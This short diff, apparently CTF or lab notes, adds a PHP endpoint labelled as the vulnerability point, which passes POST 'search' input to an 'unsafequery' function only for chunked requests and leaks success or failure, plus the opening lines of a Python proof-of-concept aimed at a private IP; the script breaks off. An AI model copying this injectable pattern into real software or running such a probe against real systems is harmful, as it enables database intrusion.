@@ -1,3 +1,25 @@
+# 漏洞点
+if (isset($_SERVER["HTTP_TRANSFER_ENCODING"]) && $_SERVER["HTTP_TRANSFER_ENCODING"] == "chunked")
+{
+    $search = $_POST['search'];
+
+    $result = unsafequery($pdo, $search);
+
+    if ($result)
+    {
+        echo "<div class='results'>No post id found.</div>";
+    }
+    else
+    {
+        http_response_code(500);
+        echo "Internal Server Error";
+        exit();
+    }
+
+}
+
+
+#POC
 import http.client
 conn = http.client.HTTPConnection("192.168.1.103") #Change this
 def send_body(payload):
